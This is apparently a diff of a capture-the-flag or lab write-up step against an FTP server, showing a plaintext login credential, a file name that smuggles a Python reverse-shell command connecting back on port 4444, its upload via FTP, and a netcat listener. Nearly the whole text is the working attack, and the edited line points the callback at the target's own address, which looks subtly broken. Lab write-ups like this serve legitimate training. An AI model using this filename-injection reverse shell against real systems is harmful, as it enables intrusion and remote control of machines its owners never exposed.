@@ -1,23 +1,15 @@
-$ ftp 10.10.10.249
-Connected to 10.10.10.249.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.249:kali): pwnmeow
-331 Please specify the password.
-Password: _G0tT4_C4tcH_'3m_4lL!_
-230 Login successful.
-
-touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.xx\"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh\"")';.csv"
-
-ls
-|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.xx",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv
+Create on local machine
+$ touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.xx\"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh\"")';.csv"
 
 $ ftp 10.10.10.249
 Connected to 10.10.10.249.
 220 (vsFTPd 3.0.3)
-Name (10.10.10.249:kali): pwnmeow
+Name (10.10.10.249:yours): pwnmeow
 331 Please specify the password.
 Password: _G0tT4_C4tcH_'3m_4lL!_
 230 Login successful.
 ftp> cd versions
 250 Directory successfully changed.
-ftp> put "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.xx\"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh\"")';.csv"
+ftp> put "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.10.249\"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh\"")';.csv"
+
+#rlwrap nc -lvnp 4444
